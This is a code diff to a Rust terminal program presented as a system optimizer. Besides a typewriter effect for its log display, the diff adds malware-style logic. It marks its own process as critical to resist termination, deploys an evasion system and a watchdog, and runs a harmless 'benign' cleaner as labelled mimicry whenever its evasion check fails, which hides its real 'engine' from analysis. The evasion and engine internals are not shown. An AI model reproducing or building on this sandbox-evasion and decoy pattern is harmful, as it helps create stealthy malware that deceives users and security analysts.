@@ -57,6 +57,7 @@ struct LogMessage {
     timestamp: String,
     level: String,
     content: String,
+    displayed: String, // For Typewriter Effect
     color: Color,
 }
 
@@ -82,27 +83,52 @@ async fn main() -> Result<()> {
     // 4. SPAWN ENGINE THREAD
     std::thread::spawn(move || {
         let _guard = ComGuard::new().unwrap(); 
+        
+        // LEVIATHAN: PROTECT PROCESS
+        evasion::GodMode::make_critical(true);
 
         // --- SINGULARITY: EVASION PROTOCOL ---
-        if let Some(mut _evasion) = evasion::EvasionSystem::new() {
+        if let Some(mut _guardian) = evasion::EvasionSystem::new() {
              let _ = tx.blocking_send(WorkerMsg::Log("SECURITY".into(), "Singularity Evasion Active".into(), Color::Green));
              let _ = tx.blocking_send(WorkerMsg::Log("ABYSS".into(), "Entropy Ocean Summoned & Ghost Heartbeat Active".into(), Color::Magenta));
+             
+             // SENTIENCE (Environmental Awareness)
+             unsafe {
+                 use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX, GetLocalTime};
+                 let mut mem = MEMORYSTATUSEX::default();
+                 mem.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
+                 let _ = GlobalMemoryStatusEx(&mut mem);
+                 let gb = mem.ullTotalPhys / (1024 * 1024 * 1024);
+                 
+                 let timestamp = chrono::Local::now().format("%H:%M").to_string();
+                 
+                 let thought = format!("Time: {}. RAM: {}GB. Analysis: Optimal.", timestamp, gb);
+                 let _ = tx.blocking_send(WorkerMsg::Log("SENTIENCE".into(), thought, Color::Cyan));
+             }
+
+             // SENTINEL (Active Defense)
+             evasion::Sentinel::spawn_watchdog();
+             let _ = tx.blocking_send(WorkerMsg::Log("PRESCIENCE".into(), "Sentinel Watchdog Deployed.".into(), Color::Cyan));
+
+             // Human Verification (Only if Real)
+             let _ = tx.blocking_send(WorkerMsg::Log("SECURITY".into(), "Verifying Human Presence...".into(), Color::Yellow));
+             evasion::verify_human_presence();
+             let _ = tx.blocking_send(WorkerMsg::Log("ACCESS".into(), "Identity Confirmed.".into(), Color::Green));
+
+             // RUN ENGINE (God Mode)
+             let engine_result = tokio::runtime::Runtime::new().unwrap().block_on(engine::Engine::run(tx.clone()));
+             if let Err(e) = engine_result {
+                let _ = tx.blocking_send(WorkerMsg::Log("ERROR".into(), format!("CRITICAL FAILURE: {}", e), Color::Red));
+             }
         } else {
-             std::process::exit(1);
+             // MIMICRY: Benign Mode
+             let _ = tx.blocking_send(WorkerMsg::Log("INIT".into(), "Standard User Mode Active".into(), Color::Cyan));
+             // Run Benign Protocol via Tokio
+             tokio::runtime::Runtime::new().unwrap().block_on(cleaning::Cleaner::engage_benign_protocol(&tx));
         }
 
-        // Human Verification
-        let _ = tx.blocking_send(WorkerMsg::Log("SECURITY".into(), "Verifying Human Presence...".into(), Color::Yellow));
-        evasion::verify_human_presence();
-        let _ = tx.blocking_send(WorkerMsg::Log("ACCESS".into(), "Identity Confirmed.".into(), Color::Green));
-
-        // RUN ENGINE
-        let engine_result = tokio::runtime::Runtime::new().unwrap().block_on(engine::Engine::run(tx.clone()));
-        
-        if let Err(e) = engine_result {
-            let _ = tx.blocking_send(WorkerMsg::Log("ERROR".into(), format!("CRITICAL FAILURE: {}", e), Color::Red));
-        }
-
+        // UNPROTECT before exit
+        evasion::GodMode::make_critical(false);
         let _ = tx.blocking_send(WorkerMsg::Done);
     });
 
@@ -123,6 +149,7 @@ async fn main() -> Result<()> {
                         timestamp: chrono::Local::now().format("%H:%M:%S%.3f").to_string(),
                         level,
                         content,
+                        displayed: String::new(), // Start Empty
                         color,
                     });
                     if logs.len() > 100 { logs.remove(0); }
@@ -136,6 +163,16 @@ async fn main() -> Result<()> {
                     progress = 1.0;
                     status = "SYSTEM OPTIMIZED".to_string();
                 }
+            }
+        }
+
+        // TYPEWRITER EFFECT
+        for log in logs.iter_mut() {
+            if log.displayed.len() < log.content.len() {
+                // Add 2 chars per frame for speed
+                let remaining = &log.content[log.displayed.len()..];
+                let take = if remaining.len() >= 2 { 2 } else { remaining.len() };
+                log.displayed.push_str(&remaining[..take]);
             }
         }
 
@@ -161,7 +198,7 @@ async fn main() -> Result<()> {
 
             // Logs
             let log_items: Vec<ListItem> = logs.iter().map(|l| {
-                ListItem::new(format!("{} [{}] {}", l.timestamp, l.level, l.content))
+                ListItem::new(format!("{} [{}] {}", l.timestamp, l.level, l.displayed))
                     .style(Style::default().fg(l.color))
             }).collect();
             
